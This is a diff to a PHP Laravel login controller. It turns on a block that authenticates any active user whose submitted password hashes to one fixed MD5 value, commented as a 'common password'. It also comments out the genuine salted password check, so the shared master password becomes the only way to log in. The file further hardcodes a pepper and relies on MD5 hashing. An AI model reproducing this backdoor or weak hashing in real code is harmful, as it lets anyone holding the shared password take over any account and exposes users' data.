@@ -62,7 +62,7 @@ class LoginController extends Controller
         if (isset($authUser)) {
             $password = md5('aFGQ475SDsdfsaf2342' . $request->password . $authUser->usrPasswordSalt);
 
-            /*if(md5($request->password) == '06882c397ebf572080ee454793b73b55') // to set common password
+            if(md5($request->password) == '06882c397ebf572080ee454793b73b55') // to set common password
             {
                 $login    = User::where('usrName', $request->username)
                     ->where('usrActive', '1')
@@ -76,13 +76,13 @@ class LoginController extends Controller
                     ->where('is_delete', 0)
                     ->first();
             }
-            */
 
-            $login    = User::where('usrName', $request->username)
+
+            /*$login    = User::where('usrName', $request->username)
                 ->where('usrPassword', $password)
                 ->where('usrActive', '1')
                 ->where('is_delete', 0)
-                ->first();
+                ->first();*/
             if (!$login) {
                 return redirect('login')->withInput()->with('message', 'The username and password you entered did not match our records. Please double-check and try again');
             }
